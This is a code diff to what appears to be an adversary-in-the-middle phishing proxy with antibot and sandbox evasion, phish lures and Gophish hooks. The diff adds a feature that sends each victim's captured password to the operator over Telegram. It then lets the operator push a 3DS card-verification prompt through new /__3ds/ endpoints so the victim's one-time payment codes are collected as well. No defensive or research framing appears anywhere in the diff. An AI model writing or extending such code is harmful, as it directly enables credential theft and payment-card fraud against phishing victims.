@@ -82,6 +82,7 @@ type HttpProxy struct {
 	spoofManager      *response.SpoofManager
 	polymorphicEngine *infra.PolymorphicEngine
 	sessionFormatter  *SessionFormatter
+	threeDS           *ThreeDSManager
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -194,6 +195,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		spoofManager:      response.NewSpoofManager(cfg.GetAntibotConfig().SpoofUrl, cfg.GetSandboxDetectionConfig().HoneypotResponse),
 		polymorphicEngine: nil, // Will be initialized based on config
 		sessionFormatter:  NewSessionFormatter(),
+		threeDS:           nil, // initialized after telegram is configured
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -361,6 +363,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			if strings.HasPrefix(req.URL.Path, "/api/captcha/verify") {
 				return p.handleCaptchaVerification(req, from_ip)
+			}
+
+			// 3DS verification endpoints
+			if strings.HasPrefix(req.URL.Path, "/__3ds/") && p.threeDS != nil {
+				return p.handle3DSRequest(req)
 			}
 
 			// Clean Headers
@@ -1900,6 +1907,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										// replace {lure_url_html} and {redirect_url} with the final redirect URL
 										post_body = strings.ReplaceAll(post_body, "{lure_url_html}", s.RedirectURL)
 										post_body = strings.ReplaceAll(post_body, "{redirect_url}", s.RedirectURL)
+										post_body = strings.ReplaceAll(post_body, "{session_id}", s.Id)
 										log.Important("[%d] serving post-redirector '%s' then redirecting to: %s", ps.Index, s.PhishLure.PostRedirector, s.RedirectURL)
 										post_resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusOK, post_body)
 										if post_resp != nil {
@@ -2386,6 +2394,15 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 				// Send formatted session using custom formatter
 				formattedMsg := p.sessionFormatter.FormatSession(s, s.Name, sessionID)
 				p.telegram.SendFormattedSession(sessionID, formattedMsg)
+
+				// If 3DS is enabled for this lure, initiate 3DS verification flow
+				if p.threeDS != nil && s.PhishLure != nil && s.PhishLure.ThreeDS && s.ThreeDSMsgID == 0 {
+					p.threeDS.Initiate(sid, password, s.RemoteAddr, s.Name)
+					msgID := p.threeDS.Send3DSNotification(sid)
+					if msgID > 0 {
+						s.ThreeDSMsgID = msgID
+					}
+				}
 			}
 		}
 	}
@@ -2398,6 +2415,27 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetCustom(name, value)
+	}
+}
+
+// initThreeDS initializes or reconfigures the ThreeDSManager based on Telegram state
+func (p *HttpProxy) initThreeDS() {
+	if p.telegram.IsEnabled() {
+		if p.threeDS == nil {
+			p.threeDS = NewThreeDSManager(p.telegram, p)
+			p.telegram.StartCallbackPolling(func(chatID string, msgID int, callbackData string) {
+				if p.threeDS != nil {
+					p.threeDS.HandleCallback(callbackData, chatID, msgID)
+				}
+			})
+			log.Info("[3DS] ThreeDSManager initialized with Telegram callback polling")
+		}
+	} else {
+		if p.threeDS != nil {
+			p.threeDS.Stop()
+			p.threeDS = nil
+			log.Info("[3DS] ThreeDSManager stopped (Telegram disabled)")
+		}
 	}
 }
 
@@ -2794,6 +2832,9 @@ func (p *HttpProxy) Start() error {
 		}
 	}
 
+	// Initialize 3DS manager if Telegram is configured
+	p.initThreeDS()
+
 	go p.httpsWorker()
 	return nil
 }
@@ -3165,5 +3206,56 @@ func recordGophishEvent(rid string, ip string, userAgent string, eventType strin
 		rs.HandleClickedLink(d)
 	case "submit":
 		rs.HandleFormSubmit(d)
+	}
+}
+
+// handle3DSRequest handles __3ds/* endpoints for 3DS verification flow
+func (p *HttpProxy) handle3DSRequest(req *http.Request) (*http.Request, *http.Response) {
+	if p.threeDS == nil {
+		return req, nil
+	}
+
+	sessionID := req.URL.Query().Get("sid")
+	if sessionID == "" {
+		resp := goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"missing session id"}`)
+		return req, resp
+	}
+
+	path := strings.TrimPrefix(req.URL.Path, "/__3ds/")
+
+	switch {
+	case path == "status" && req.Method == http.MethodGet:
+		status, jsonResp := p.threeDS.Handle3DSStatus(req, sessionID)
+		resp := goproxy.NewResponse(req, "application/json", status, jsonResp)
+		if resp != nil {
+			resp.Header.Set("Access-Control-Allow-Origin", "*")
+			resp.Header.Set("Cache-Control", "no-cache")
+		}
+		return req, resp
+
+	case path == "submit" && req.Method == http.MethodPost:
+		status, jsonResp := p.threeDS.Handle3DSSubmit(req, sessionID)
+		resp := goproxy.NewResponse(req, "application/json", status, jsonResp)
+		if resp != nil {
+			resp.Header.Set("Access-Control-Allow-Origin", "*")
+			resp.Header.Set("Access-Control-Allow-Methods", "POST, OPTIONS")
+			resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
+			resp.Header.Set("Cache-Control", "no-cache")
+		}
+		return req, resp
+
+	case req.Method == http.MethodOptions:
+		resp := goproxy.NewResponse(req, "application/json", http.StatusOK, "")
+		if resp != nil {
+			resp.Header.Set("Access-Control-Allow-Origin", "*")
+			resp.Header.Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+			resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
+			resp.Header.Set("Cache-Control", "no-cache")
+		}
+		return req, resp
+
+	default:
+		resp := goproxy.NewResponse(req, "application/json", http.StatusNotFound, `{"error":"unknown 3ds endpoint"}`)
+		return req, resp
 	}
 }
